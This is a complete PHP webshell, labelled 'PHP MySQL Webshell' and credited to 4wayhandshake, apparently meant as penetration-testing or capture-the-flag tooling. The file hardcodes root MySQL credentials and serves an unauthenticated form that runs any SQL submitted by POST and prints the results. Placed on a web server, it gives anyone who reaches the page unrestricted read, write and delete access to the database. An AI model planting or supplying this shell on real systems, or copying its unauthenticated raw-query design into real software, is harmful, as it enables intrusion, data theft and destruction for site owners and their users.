<?php
/*

Simple Database Shell
(Works with MySQL)

4wayhandshake, March 2025

*/
$databaseServer = 'localhost';
$databaseUsername = 'root';
$databasePassword = 'root';
$databaseName = 'mywebapp';

// Enable MySQLi to throw exceptions on errors.
mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);

try {
    $myconnection = new mysqli($databaseServer, $databaseUsername, $databasePassword, $databaseName);
    $myconnection->set_charset("utf8mb4");
} catch (Exception $e) {
    die("Connection failed: " . htmlspecialchars($e->getMessage()));
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>PHP MySQL Webshell</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        table { border-collapse: collapse; width: 100%; margin-top: 20px; }
        th, td { border: 1px solid #ccc; padding: 8px; text-align: left; font-family: Monospace; }
        th { background-color: #f2f2f2; }
        input[type="text"] { width: 80%; padding: 8px; }
        input[type="submit"] { padding: 8px 16px; }
    </style>
</head>
<body>
    <h1>PHP MySQL Webshell</h1>
    <form method="post" action="#">
        <input type="text" name="qry" placeholder="Enter your SQL query here" required>
        <input type="submit" value="Submit">
    </form>

<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['qry'])) {
    $userQuery = trim($_POST['qry']);
    try {
        $result = $myconnection->query($userQuery);
        if ($result === false) {
            echo "<p style='color: red;'>Error executing query: " . htmlspecialchars($myconnection->error) . "</p>";
        } else {
            if ($result instanceof mysqli_result) {
                echo "<table>";
                echo "<tr>";
                while ($field = $result->fetch_field()) {
                    echo "<th>" . htmlspecialchars($field->name) . "</th>";
                }
                echo "</tr>";
                $result->data_seek(0);
                while ($row = $result->fetch_assoc()) {
                    echo "<tr>";
                    foreach ($row as $cell) {
                        echo "<td>" . htmlspecialchars($cell) . "</td>";
                    }
                    echo "</tr>";
                }
                echo "</table>";
                $rowCount = $result->num_rows;
                echo "<pre>Row count: " . $rowCount . "</pre>";
                $result->free();
            } else {
                echo "<p>Query executed successfully.</p>";
            }
        }
    } catch (Exception $e) {
        echo "<p style='color: red;'>Exception: " . htmlspecialchars($e->getMessage()) . "</p>";
    }
}
?>
</body>
</html>
